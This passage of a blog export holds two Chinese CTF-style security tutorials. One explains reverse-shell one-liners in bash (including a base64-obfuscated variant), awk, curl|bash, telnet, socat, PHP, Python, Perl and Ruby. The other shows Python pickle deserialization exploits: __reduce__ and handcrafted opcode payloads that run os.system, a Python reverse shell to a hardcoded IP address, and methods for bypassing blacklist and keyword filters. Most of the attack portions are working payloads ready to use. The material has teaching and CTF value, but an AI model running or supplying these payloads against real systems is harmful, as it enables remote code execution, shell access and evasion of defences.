2&gt;1.txt，这个时候就会将2输出到1.txt文件中这个时候就知道&gt;的作用了，接下来看一下&amp;我们知道&amp;是联合字符，相当于and，作用是连接前后，那么这里的话其实就是将前面和后面一起重定向给后面接下来看这个/dev/tcp/xxx.xxx.xxx.xxx/7777在linux中，一切都是以文件形式存在的，这里的话就是和xxx这个ip地址的7777端口建立一个tcp连接接下来看一下0&gt;&amp;1,这里的&amp;有特殊含义,具体如下\n\n\n\n\n\n\n\n\n\n这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp;，系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述\n这个0是与前面的攻击机结合的，输入0是由/dev/tcp/xxx.xxx.xxx.xxx/7777输入的，命令执行结果是1，当我们用重定向符&gt;，写出0&gt;&amp;1，这就实现了输入输出都在攻击机上。这个时候的话再来看这个完整语句就比较好理解了\nbash -i>&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&amp;1\n先是bash生成交互环境，然后用发起与攻击机7777端口的连接（tcp连接），然后重定向给攻击机端口，而后将标准输出重定向到标准输入中，这就是整个语句的过程。\ndemo攻击机，开启监听\nnc -lvnp 7777\n\n目标机，执行bash语句\nbash -i>&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&amp;1\n出现了点bug，百度过后说是因为shell由bash解析，有时候是由zsh或sh解析，所以不一定会执行，但是我试了试发现把它进行base64加密后，这样就可以执行\nbash -c '&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEzNC4yMTIuMjI1LjE0Mi83Nzc3IDA+JjEgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'\n解释一下，bash -c参数后接一个指令，然后会执行这个语句base64解密后就是/bin/bash -i &gt;&amp; /dev/tcp/134.212.225.142/7777 0&gt;&amp;1  \n此时再查看攻击机成功反弹shell\nawkAWK 是一种处理文本文件的语言，是一个强大的文本分析工具。这里我们用的话其实也就是用到了一个他的for循环这些基础知识，有兴趣的师傅们可以参考这篇文章来具体的了解awkhttps://github.com/mylxsw/growing-up/blob/master/doc这里我先将语句列出，而后再进行解释\nawk 'BEGIN&#123;s=\"/inet/tcp/0/IP/Port\";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'\nBEGIN语句块在程序开始的使用执行，它只执行一次,BEGIN中的内容是awk要执行的命令，那么这里的话就是与攻击机的某个端口进行了tcp链接，而后你可以看见是一个for循环，初始化内容为空，然后条件对应的内容是读取s放入变量c中，然后增量是每次关闭c管道。接下来是一个while循环，条件对应的内容是读取c放入$0中，如果满足就输出，否则就关闭s管道\n注：参考了很多师傅的博客，但感觉还是理解有点问题，还请各位师傅多多指正\ndemo攻击机，开启监听目标机，调用awk语句，具体如下\nawk 'BEGIN&#123;s=\"/inet/tcp/0/xxx.xxx.xxx.xxx/7777\";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'\n此时再看攻击机成功反弹shell\nCurl结合Bash进行反弹shell这个就是用于绕过的，当目标机存在某些防护过滤了一些字符时，我们可以通过这个来实现反弹shell，语句如下\ncurl ip|bash\n它的话其实就是以bash解析shell，对ip进行curl指令，即请求这个ip，然后我们的这个ip的内容是bash反弹shell的语句，即\nbash -i>&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&amp;1\n此时就可以绕过防护且成功反弹shell，这个时候也就应该可以理解上文的绕过方式了\ndemo攻击机首先上准备一个界面，其内容是bash反弹shell语句然后接下来去监听7777端口目标机:开始curl语句请求对应端口接下来查看攻击机成功反弹shell，可以执行语句\nTalentTelnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。 它为用户提供了在本地计算机上完成远程主机工作的能力。这里的话有两种方法，先介绍第一种方式第一种方式的话先给出参考payload\ntelnet xxx.xxx.xxx.xxx port| /bin/bash | telnet xxx.xxx.xxx.xxx port2\n这个的话就是用talnet主动连接攻击机的某个端口，然后将输出信息作为bash的输入，即用bash执行其输出信息，接下来用管道符将bash的输出重定向到talnet连接的攻击机的另一个端口下，其实也就是将回显输出到这个端口下了，此时实现了攻击机port端口执行的语句，在port2端口可以看到回显信息\n第二种方式先给出参考payload\nmknod a p; telnet xxx.xxx.xxx.xxx port 0&lt;a | bin/bash 1>a\n\n就是创建一个管道a，然后用talent与攻击机的某个端口进行连接，再用重定向将标准输入定向到管道a中，接下来再用管道符|，将左边的输出作为右边的输入，也就是说用bash执行talent的输出信息，然后1&gt;a，就是将标准输出重定向到a，这个时候就实现了标准输入和输出都在同一个管道下\ndemo攻击机监听两个端口，一个用于执行指令，一个用于查看回显\nnc -lvnp 7777\nnc -lvnp 6379\n目标机用talent发送两个请求，分别请求攻击机的两个端口，一个用于将bash终端发送出去，一个用于获取bash的输出信息\ntelnet xxx.xxx.xxx.xxx 7777 | /bin/bash | telnet xxx.xxx.xxx.xxx 6379\n此时查看攻击机，发现成功连接，执行命令查看另一个端口成功反弹shell\ndemo2\n\n\n\n\n\n\n\n\n这个需要是root权限，普通用户没有权限执行mknod命令\n攻击机，开启监听目标机，用重定向将输入输出定向到同一个管道中，同时用telent主动连接攻击机\nmknod a p; telnet xxx.xxx.xxx.xxx 7777 0&lt;a | /bin/bash 1>a\n\n\nSocatSocat，全称Socket CAT，其功能类似于netcat这个的话是我们需要提前安装的，那想要利用这个实现反弹shell的话，就需要目标机有这个环境这个怎么安装呢，用apt-get install Socat即可接下来说一下它的思路，其实就是利用Socat向攻击机某个端口发送请求，然后用exec执行语句，得到bash交换环境\ndemo攻击机，开启监听目标机，用socat连接ip连接，用exec搭建bash交互环境，执行语句如下\nsocat tcp-connect:xxx.xxx.xxx.xxx:7777 exec:'bash -li',pty,stderr,setsid,sigint,sane \n此时查看攻击机成功执行\n脚本类反弹shell当目标机存在一些语言环境时，也可以借助对应语言脚本来实现反弹shell，这里给出一些网上常见的反弹shell语句，仅供参考\nPHP语言反弹shell\nphp -r '$sock=fsockopen(\"IP\",\"Port\");exec(\"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3\");'\nPython反弹shell\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nPerl反弹shell\nperl -e 'use Socket;$i=\"IP\";$p=Port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"/bin/bash -i\");&#125;;'\nruby反弹shell\nruby -rsocket -e 'c=TCPSocket.new(\"IP\",\"Port\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'\n后文这里的话也是将网络中较常见的反弹shell简单总结了一下，如果有问题的话还请各位师傅多多指教。\n参考文章https://xz.aliyun.com/t/2549https://www.freebuf.com/articles/network/334613.htmlhttps://www.modb.pro/db/421543https://www.jianshu.com/p/37924017feb1https://www.freebuf.com/articles/web/247967.htmlhttps://www.anquanke.com/post/id/87017https://blog.csdn.net/weixin_44288604/article/details/111740527\n","slug":"从一道题目中学习反弹shell","date":"2022-10-17T17:16:30.000Z","categories_index":"命令执行","tags_index":"反弹shell","author_index":"quan9i"},{"id":"7c4cd24912c14890fdfeed8e71bda8c9","title":"Python 反序列化浅析","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1782/\n前言之前所接触的大多是PHP 反序列化题型，最近遇见了一道Python pickle反序列化类型题，因此学习了一下其反序列化，简单总结如下，希望能对各位师傅有所帮助。\nPickle师傅们可自行先参考一下官方文档https://docs.python.org/zh-cn/3/library/pickle.html\n定义\n\n\n\n\n\n\n\n\n模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。\n通俗易懂的说，就是pickle实现了基本数据的序列化和反序列化。\n方法Pickle包含四种方法，具体如下所示\npickle.dump(obj, file)\n//将obj对象进行封存，即序列化，然后写入到file文件中\n//注:这里的file需要以wb打开(二进制可写模式)\npickle.load(file)\n//将file这个文件进行解封，即反序列化\n//注:这里的file需要以rb打开(二进制可读模式)\npickle.dumps(obj)\n//将obj对象进行封存，即序列化，然后将其作为bytes类型直接返回\npickle.loads(data)\n//将data解封，即进行反序列化\n//注:data要求为bytes-like object(字节类对象)\n有关字节类对象，可以看官方这里的介绍https://docs.python.org/zh-cn/3/glossary.html#term-bytes-like-object看到这里的话，其实也就明白了一点，常用的也就是dump和load，类似于PHP的seralize和unseralize这里简单举个例子\nimport pickle\n\nzj = 'tttang'\n\nfilename = \"tttang\"\n# 序列化\nwith open(filename, 'wb') as f:#以二进制可写形式打开tttang这个文件\n    pickle.dump(zj, f) #将zj这个变量对应的字符串进行序列化并写入到f中\n# 读取序列化后生成的文件\nwith open(filename, \"rb\") as f:\n    print(f.read())\n\n# 反序列化\nwith open(filename, \"rb\") as f: #以二进制可读形式打开tttang这个文件\n    print(pickle.load(f)) #将这个文件进行反序列化并输出\n运行结果\ndemo源码分析想要理解反序列化，就得从最根本开始，因此这里从源码开始入手\nctrl+鼠标左键查看load源码找到load方法这里的大致含义就是将内容以二进制字节流形式读取并存放到file中，而后我们看到返回中利用了load()方法，继续跟进这里主要看下面的这一点\ntry:\n    while True:\n        key = read(1)\n        if not key:\n            raise EOFError\n        assert isinstance(key, bytes_types)\n        dispatch[key[0]](self)\nexcept _Stop as stopinst:\n    return stopinst.value\n这里大致含义就是将字符串中的字符挨个进行读取，然后通过dispatch字典索引，调用对应方法这里我们的字符串是\nb'\\x80\\x04\\x95\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x06tttang\\x94.'\n第一步第一个也就是\\x80，查一下这个\\x80发现对应的是PROTO，那么这里的话就是 dispatch[PROTO[0]]，其对应的是load_proto方法，跟进\ndef load_proto(self):\n    proto = self.read(1)[0]\n    if not 0 &lt;= proto &lt;= HIGHEST_PROTOCOL:\n        raise ValueError(\"unsupported pickle protocol: %d\" % proto)\n    self.proto = proto\n发现这里是再读取一个字符串，然后这里的话是读取的\\x04,其含义大概是说这是一个根据四号协议反序列化的字符串\n第二步此时读取的字符串是\\x95,搜索过后发现其对应\nFRAME            = b'\\x95'  # indicate the beginning of a new frame\n查这个frame对应函数，即load_frame\ndef load_frame(self):\n    frame_size, = unpack('&lt;Q', self.read(8))\n    if frame_size > sys.maxsize:\n        raise ValueError(\"frame size > sys.maxsize: %d\" % frame_size)\n    self._unframer.load_frame(frame_size)\n这里是又往后读取了八位代表frame的大小，这里的八位是\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00，表示其大小为0，后面的大致含义是将其进行二进制字节流转换然后赋值给current_frame。\n第三步这里到了\\x8c，搜到对应的是SHORT_BINUNICODE，对应方法如下\ndef load_short_binunicode(self):\n    len = self.read(1)[0]\n    self.append(str(self.read(len), 'utf-8', 'surrogatepass'))\n这里又往下读取了一位，然后调用了append方法，我们跟进一下\nself.stack = []\nself.append = self.stack.append\n那么这里的话大致含义就是设置一个空数组，然后将读取的下一位存放进去（入栈），下一位是\\x06tttang，此时就把它存入栈中了\n第四步此时继续往下读取字符串，对应的是\\x94，对应方法是load_memoize，跟进\ndef load_memoize(self):\n    memo = self.memo\n    memo[len(memo)] = self.stack[-1]\n这里的话大致含义就是memo是个空数组，然后它将栈中-1对应元素取出，存入数组中\n第五步此时读取到最后一个字符串.，其对应的是stop，这里就结束了反序列化\n示例及源码分析上述只是一种简单的示例，抛砖引玉了属于是，而常见的序列化和反序列化，往往是出现在类和对象中，这里举出一个具体实例\nimport pickle\n\nclass tttang:\n    def __init__(self,name,age):\n        self.name=name\n        self.age=age\na=pickle.dumps(tttang(\"quan9i\",\"19\"))\nprint(a)\n得到结果如下\nb'\\x80\\x04\\x95:\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06tttang\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x04name\\x94\\x8c\\x06quan9i\\x94\\x8c\\x03age\\x94\\x8c\\x0219\\x94ub.'\n由于刚刚已经说过了具体代码，所以这里不再放出自定义函数对应代码(师傅们自行查看源码更能增强理解)\n第一步读取\\x80，其对应的是PROTO，这里调用load_proto方法，函数内容是读取下一个字符，读取到\\x04，这里的含义是表示这是一个根据四号协议序列化的字符串。\n第二步读取\\x95，其对应的是FRAME，这里调用load_frame方法,函数内容是读取八个字符串,这里是:\\x00\\x00\\x00\\x00\\x00\\x00\\x00，然后将其值进行二进制字节流转换赋值给current_frame\n第三步读取\\x8c，其对应的是SHORT_BINUNICODE，对应方法是load_short_binunicode，函数内容是向下读取一位，然后压入栈中\nstack:[__main__]\n第四步读取\\x94，其对应的是MEMOIZE，对应方法是load_memoize，函数内容是将栈中-1对应元素赋值给memo[0],这里的话就是memo[0]=\\x08__main，而memo等于&#123;&#125;，那么这里就是&#123;\\x08__main&#125;\n第五步读取\\x8c,向下读取一位然后压入栈中，下一位是\\x06tttang，这里的话就是\nstack:[__main__,tttang]\n第六步读取\\x94，将栈中-1对应元素存入memo[1]中，这里的话就是memo[1]=tttang\n第七步读取\\x93，对应函数是load_stack_global,函数内容是将栈中元素取出一个，作为对象名，这里就是name=tttang，接下来再取出一个，作为类名，这里就是module=__main__，然后压入栈中\nstack:[&lt;class '__main__.tttang'>]\n第八步读取\\x94，将栈中-1对应元素存入memo[2]中，这里的话就是将上面的字符串保存到memo[2]中\n第九步读取)，对应的是EMPTY_TUPLE，也就是向栈中加入空元组\nstack:[&lt;class '__main__.tttang'>,()]\n\n第十步读取\\x81,对应函数是load_newobj,弹出()赋值给args，然后将class &#39;__main__.tttang&#39;赋值给cls，接下来cls.__new__(cls,*args)实例化对象，由于args为空，所以这里仍然是一个空的tttang对象\nstack:[&lt;class '__main__.tttang'>]\n\n第十步读取\\x94，将上面实例化过后的对象存入memo[3]\n第十一步读取&#125;，往栈中压入空的字典\nstack:[&lt;class '__main__.tttang'>,&#123;&#125;]\n第十二步读取\\x94，将上述字符串存入memo[4]\n第十三步读取(，对应方法为load_mark,函数内容是将栈中元素压入到metastack中，然后将栈置空\n第十四步读取\\x8c，向下读取一位压入栈中，下一位是\\x04name(\\x04代表name的长度)，这里就是\nstack:[name]\n第十五步读取\\x94，这里的话栈中是name，因此就是memo[5]=name\n第十六步读取\\x8c，向下读取一位压入栈中，这里的话下一位是\\x06quan9i，因此就是\nstack:[name,quan9i]\n第十七步读取\\x94，即memo[6]=quan9i\n第十八步读取\\x8c，读取下一位\\x03age，所以栈为\nstack:[name,quan9i,age]\n第十九步读取x94，这里的话是memo[7]=age\n第二十步读取\\x8c，读取下一位\\x0219，所以栈为\nstack:[name,quan9i,age,19]\n第二十一步读取\\x94，即memo[8]=19\n第二十二步读取u,对应函数为load_setitems,将栈赋值给items变量，然后将metastack中的弹出赋值给栈，所以这里的栈就变成了&lt;class &#39;__main__.tttang&#39;&gt;,&#123;&#125;，这里的话就是取出__main__.tttang作为字典，接下来进行range遍历\n__main__.tttang[items[0]]=items[1]\n__main__.tttang[items[2]]=items[3]\n因此这里就是\n__main__.tttang[name]=quan9i\n__main__.tttang[age]=19\n那么这里的话栈就变成\nstack:[&lt;class '__main__.tttang'>,&#123;'name':'quan9i','age':'19'&#125;]\n\n第二十三步读取b，对应方法为load_build，弹出&#123;&#39;name&#39;:&#39;quan9i&#39;,&#39;age&#39;:&#39;19&#39;&#125;赋值给state，弹出class &#39;__main__.tttang&#39;赋值给inst,如果inst中存在setstate，就用setstate来处理state，否则就存入inst_dict中\n第二十四步读取.，结束反序列化\n大家在自行阅读源码过后也可以通过pickletools来查看自己的大体思路是否出错这个模块调用也比较简单，如下所示\nimport pickle\nimport pickletools\nclass tttang:\n    def __init__(self,name,age):\n        self.name=name\n        self.age=age\na=pickle.dumps(tttang(\"quan9i\",\"19\"))\nprint(a)\npickletools.dis(a)\n结果如下图\n漏洞成因Pickle之所以出现反序列化漏洞的原因，是因为pickle数据是完全可控的，我们可以用来表示任意对象，官方也声明了其危险性。\n漏洞利用全局变量覆盖举个例子现在存在一个文件secret.py，内容如下\nkey='flag&#123;xxx&#125;'\n如果我们能把它修改成tttang，就算是解题成功。那我们该怎么实现呢方法的话其实是很简单的，我们只需要通过c操作符得到全局变量secret，然后利用b操作符修改属性值即可，构造payload如下\nc__main__\nsecret\n(S'key'\nS'tttang'\ndb.\n测试代码如下\nimport pickle\nimport secret\n\npayload='''c__main__\nsecret\n(S'key'\nS'tttang'\ndb.'''\n\nprint('before:',secret.key)\n\noutput=pickle.loads(payload.encode())\n\nprint('output:',output)\nprint('after:',secret.key)\n结果如下\n函数执行—reduce—方法常见的利用方式是什么呢，我们这里就需要提到一个方法了,这个方法就是__reduce__方法，简单介绍一下\n__reduce__\n调用:被定义之后，当对象被pickle时就会触发\n作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle\n\t如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用\n这里给出一个简单的demo\n#encoding: utf-8\nimport os\nimport pickle\nclass tttang(object):\n    def __reduce__(self):\n        return (os.system,('whoami',))\na=tttang()\npayload=pickle.dumps(a)\nprint(payload)\npickle.loads(payload)\n可以看到成功执行了命令这个不仅可以实现函数利用，也可以实现反弹shell，如下所示\nimport pickle\nimport os\n\nclass tttang(object):\n    def __reduce__(self):\n        a=\"\"\"\n        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.222.255.142\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"\n        return (os.system,(a,))\n\na = tttang()\npickle.loads(pickle.dumps(a))\n\n编写opcode实现函数执行函数执行，这就要提到opcode,也就是那序列化后的那些字符，它们都有一定的含义，我们也可以通过编写opcode实现函数执行，具体的大家可以看这里https://github.com/python/cpython/blob/main/Lib/pickle.py#L111hachp1 大师傅总结了一下常用的opcode及其功能，如下所示(参考自https://xz.aliyun.com/t/7436)\n\n\nopcode\n描述\n具体写法\n栈上的变化\nmemo上的变化\n\n\n\n\nc\n获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）\nc[module]\\n[instance]\\n\n获得的对象入栈\n无\n\n\no\n寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）\no\n这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈\n无\n\n\ni\n相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）\ni[module]\\n[callable]\\n\n这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈\n无\n\n\nN\n实例化一个None\nN\n获得的对象入栈\n无\n\n\nS\n实例化一个字符串对象\nS'xxx'\\n（也可以使用双引号、\\'等python字符串形式）\n获得的对象入栈\n无\n\n\nV\n实例化一个UNICODE字符串对象\nVxxx\\n\n获得的对象入栈\n无\n\n\nI\n实例化一个int对象\nIxxx\\n\n获得的对象入栈\n无\n\n\nF\n实例化一个float对象\nFx.x\\n\n获得的对象入栈\n无\n\n\nR\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nR\n函数和参数出栈，函数的返回值入栈\n无\n\n\n.\n程序结束，栈顶的一个元素作为pickle.loads()的返回值\n.\n无\n无\n\n\n(\n向栈中压入一个MARK标记\n(\nMARK标记入栈\n无\n\n\nt\n寻找栈中的上一个MARK，并组合之间的数据为元组\nt\nMARK标记以及被组合的数据出栈，获得的对象入栈\n无\n\n\n)\n向栈中直接压入一个空元组\n)\n空元组入栈\n无\n\n\nl\n寻找栈中的上一个MARK，并组合之间的数据为列表\nl\nMARK标记以及被组合的数据出栈，获得的对象入栈\n无\n\n\n]\n向栈中直接压入一个空列表\n]\n空列表入栈\n无\n\n\nd\n寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）\nd\nMARK标记以及被组合的数据出栈，获得的对象入栈\n无\n\n\n}\n向栈中直接压入一个空字典\n}\n空字典入栈\n无\n\n\np\n将栈顶对象储存至memo_n\npn\\n\n无\n对象被储存\n\n\ng\n将memo_n的对象压栈\ngn\\n\n对象被压栈\n无\n\n\n0\n丢弃栈顶对象\n0\n栈顶对象被丢弃\n无\n\n\nb\n使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置\nb\n栈上第一个元素出栈\n无\n\n\ns\n将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中\ns\n第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新\n无\n\n\nu\n寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中\nu\nMARK标记以及被组合的数据出栈，字典被更新\n无\n\n\na\n将栈的第一个元素append到第二个元素(列表)中\na\n栈顶元素出栈，第二个元素（列表）被更新\n无\n\n\ne\n寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中\ne\nMARK标记以及被组合的数据出栈，列表被更新\n无\n\n\n\n\n看过这个之后，就大致了解了每个opcode的作用，现在来说一下函数执行函数执行常用的有以下几个操作符\nR操作符R操作符，其对应的函数如下所示\ndef load_reduce(self):\n    stack = self.stack\n    args = stack.pop()\n    func = stack[-1]\n    stack[-1] = func(*args)\n简单分析一下弹出栈作为函数执行的参数，因此这里的参数需要是元组形式，然后取栈中最后一个元素作为函数，并将指向结果赋值给此元素因此这里的话，我们想执行的命令whoami放入栈中，再把system模块放入栈中，即可实现函数的函数执行构造payload如下\na=b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.'\n解读一下，字符c读取moduleos，读取namesystem,此时就构造出了os.system字符X，往后读取四位\\x06\\x00\\x00\\x00whoami字符\\x85，它将最后一个数据变成元组重新入栈字符.，结束了反序列化\n测试代码\nimport pickle\na=b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.'\nflag=pickle.loads(a)\n\ni操作符i操作符，其对应函数如下所示\ndef load_inst(self):\n       module = self.readline()[:-1].decode(\"ascii\")\n       name = self.readline()[:-1].decode(\"ascii\")\n       klass = self.find_class(module, name)\n       self._instantiate(klass, self.pop_mark())\n分析函数向下依次读取两行分别作为module和name，然后利用find_class寻找对应方法，通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中，pop_mark()对应代码\ndef pop_mark(self):\n    items = self.stack\n    self.stack = self.metastack.pop()\n    self.append = self.stack.append\n    return items\n简单分析一下，这里是获取当前栈赋给items，然后弹出栈内元素，再把这个栈赋值给当前栈，然后返回items构造payload如下\nb'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.'\n解读一下字符(，为了与后面的字符i作对应，i字符寻找上一个MARK来闭合，然后组合其内的数据作为元组，以此元组作为函数参数字符X，向后读取四个字符串\\x06\\x00\\x00\\x00whoami而后压入栈中字符i，往后读取两行得到os.system，调用参数并执行字符.，结束反序列化\n测试代码\nimport pickle\na=b'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.'\nb=pickle.loads(a)\n\no操作符o操作符，其对应函数如下所示\ndef load_obj(self):\n    # Stack is ... markobject classobject arg1 arg2 ...\n    args = self.pop_mark()\n    cls = args.pop(0)\n    self._instantiate(cls, args)\n简单分析一下，这个函数先弹出栈中一个元素作为args，也就是参数，而后再弹出第一个元素作为函数，调用_instantiate函数自执行\n构造payload如下\nb'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.'\n解读一下字符(，为了和之后的字符o对应，实现闭合，获取函数及参数字符c，往后读取两行，得到函数os.system字符X,往后读取四位得到x06\\x00\\x00\\x00whoami，即whoami字符o，与(实现闭合，将第一个元素，也就是os.system作为函数，第二个元素whoami作为参数，执行字符.，结束反序列化\n测试代码\nimport pickle\na=b'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.'\nb=pickle.loads(a)\n\nb操作符b操作符，其对应函数如下所示\ndef load_build(self):\n    stack = self.stack\n    state = stack.pop()\n    inst = stack[-1]\n    setstate = getattr(inst, \"__setstate__\", None)\n    if setstate is not None:\n        setstate(state)\n        return\n    slotstate = None\n    if isinstance(state, tuple) and len(state) == 2:\n        state, slotstate = state\n    if state:\n        inst_dict = inst.__dict__\n        intern = sys.intern\n        for k, v in state.items():\n            if type(k) is str:\n                inst_dict[intern(k)] = v\n            else:\n                inst_dict[k] = v\n    if slotstate:\n        for k, v in slotstate.items():\n            setattr(inst, k, v)\n简单分析一下，这个函数是当栈中存在__setstate__时，就会执行setstate(state)，因此我们这里自定义一个__setstate__类，分别构造os.system和whoami即可执行命令构造payload如下\nb'c__main__\\ntttang\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.'\n解读一下字符c，往后读取两行，得到主函数和类，__main__.tttang字符)，向栈中压入空元祖()字符&#125;，向栈中压入空字典&#123;&#125;字符X，读取四位\\x0C\\x00\\x00\\x00__setstate__,得到__setstate__字符c，向后读取两行，得到函数os.system字符s，将第一个和第二个元素作为键值对，添加到第三个元素中，此时也就是&#123;__main.tttang:()&#125;，__setstate__,os.system字符b，第一个元素出栈，此时也就是&#123;&#39;__setstate__&#39;: os.system&#125;,此时执行一次setstate(state)字符X，往后读取四位x06\\x00\\x00\\x00whoami，即whoami字符b，弹出元素whoami此时state为whoami，执行os.system(whoami)字符.，结束反序列化\n测试代码如下\nimport pickle\nclass tttang:\n    def __init__(self):\n            self.name=\"quan9i\"\na=b'c__main__\\ntttang\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.'\nb=pickle.loads(a)\n\n界限突破（绕WAF）黑名单绕过官方在声明Python反序列化时就已经意识到了其具有危险性，自然有一定的方法来进行防护。\n\n\n\n\n\n\n\n\n\n官方给出的安全反序列化是继承了pickle.Pickler类，并重载了find_class方法\n常见的是设置了一些黑名单来进行绕过，示例如下\nimport pickle\nimport io\nimport builtins\n__all__ = ('PickleSerializer',)\nclass RestrictedUnpickler(pickle.Unpickler):\n    blacklist=&#123;'eval','exec','open','__import__','exit','input'&#125;\n    def find_class(self,module,name):\n        if module == \"builtins\" and name not in self.blacklist:\n            return getattr(builtins,name)\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\"%(module ,name))\n这里设置了黑名单，禁止利用eval和exec等函数但我们会发现这里getattr没有被ban，__builtins__中存在着很多函数，这就意味着我们可以builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)来获取eval等黑名单函数。构造payload如下\nbuiltins.getattr(builtins, 'eval'),('__import__(\"os\").system(\"whoami\")',)\n该如何编写对应的opcode呢？一步步来即可\n首先，构造出builtins.getattr，这里的话就用c操作符来调用出模块和函数，因此这里的话就写出了\ncbuiltins\ngetattr\n接下来压入的话会发现，其中含有个对象，而其他压入的都是字符串，如果直接压入的话会出错，这里的话可以这样\nbuiltins = builtins.globals().get('builtins')\n构造一下\ncbuiltins\nglobals  #得到builtins.globals\ncbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR.   #获取到globals中的dict类中的get方法\n接下来再用dict.get从globals中就获取builtins就可以\ncbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals   #得到globals()\n(tRS'builtins' #读取builtins\ntR. #t是与(形成元组，R是执行，师傅们自行解读一下可以就理解了\n写个简单的demo测试一下是否成功构造出了builtins\nimport pickle,builtins\n\npayload=b\"\"\"cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n(tRS'builtins'\ntR.\n\"\"\"\na=pickle.loads(payload)\nprint(a)\n接下来只需要构造eval就可以了，构造最终payload如下\nb\"\"\"cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n(tRS'builtins'\ntRS'eval'\ntRp1\n(S'__import__(\"os\").system(\"whoami\")'\ntR.\"\"\"\n这个是通过R操作符实现的函数执行，也可以通过O操作符和i操作符实现，这里借用一下枫霄云大师傅的opcode\no操作码：\nb'\\x80\\x03(cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00getop2\\n0(g2\\n(cbuiltins\\nglobals\\noX\\x0C\\x00\\x00\\x00__builtins__op3\\n(g0\\ng3\\nX\\x04\\x00\\x00\\x00evalop4\\n(g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")o.'\n关键词绕过之前提到变量覆盖的时候，用到了变量名key，而如果禁止使用这个关键词，我们该怎么办呢，有以下几种方法\nV操作符绕过这里可以借用V操作符来实现关键字绕过,V操作符可以实例化一个unicode字符串对象。我们之前的payload\nc__main__\nsecret\n(S'key'\nS'tttang'\ndb.\n修改过后的payload\nc__main__\nsecret\n(V\\u006bey\nS'tttang'\ndb.\n可以发现成功实现变量覆盖\n十六进制绕过S操作符是可以识别十六进制的，因此这里也可以对字符进行十六进制编码，从而绕过，构造payload如下\nc__main__\nsecret\n(S'\\x6bey'\nS'tttang'\ndb.\n\n内置函数获取关键字当我们引用某个模块时，我们可以通过sys.modules[xxx]来获取其全部属性，然后我们可以输出全部属性，示例如下\nimport secret\nimport 